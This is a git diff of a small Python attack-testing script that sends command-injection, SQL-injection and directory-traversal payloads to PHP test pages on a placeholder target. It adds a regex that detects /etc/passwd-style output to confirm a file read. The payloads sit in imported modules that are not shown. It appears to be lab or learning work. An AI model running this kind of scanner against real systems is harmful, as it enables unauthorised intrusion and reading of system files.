@@ -4,6 +4,7 @@ import oRedirect
 import re
 import sqli
 import cmd
+import dirtraversal
 from datetime import datetime
 
 BASE_URL = "http://target.com"
@@ -45,6 +46,12 @@ def checkSuccess(html, attackType, content, v=False):
 	if v == True:
 		print html
 
+	if attackType == directory_traversal:
+		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
+		if len(match) == 0:
+			return None
+		return match
+
 	if attackType == shell_command:
 		match = re.findall(r'GNU/Linux', html)
 		if len(match) == 0:
@@ -75,19 +82,28 @@ def checkSuccess(html, attackType, content, v=False):
 	
 
 if __name__ == "__main__":
+	## test directory shell
+    url = '/directorytraversal/directorytraversal.php'
+    payloads = dirtraversal.get_all()
 
-	## test shell command
-	url = "/commandinjection/commandinjection.php"
-	payloads = cmd.get_all()
-	for payload in payloads:
-		injectPayload(url, "host", 'POST', payload)
+    for payload in payloads:
+        ## capture param after url ?param=
+        
+        injectPayload(url, 'ascii', 'GET', payload)
 
 
-	#sqli
-	url = "/sqli/sqli.php"
-	payloads = sqli.get_all()
-	for payload in payloads:
-		injectPayload(url, "username", "POST", payload)
+	# ## test shell command
+	# url = "/commandinjection/commandinjection.php"
+	# payloads = cmd.get_all()
+	# for payload in payloads:
+	# 	injectPayload(url, "host", 'POST', payload)
+
+
+	# #sqli
+	# url = "/sqli/sqli.php"
+	# payloads = sqli.get_all()
+	# for payload in payloads:
+	# 	injectPayload(url, "username", "POST", payload)
 
 
 
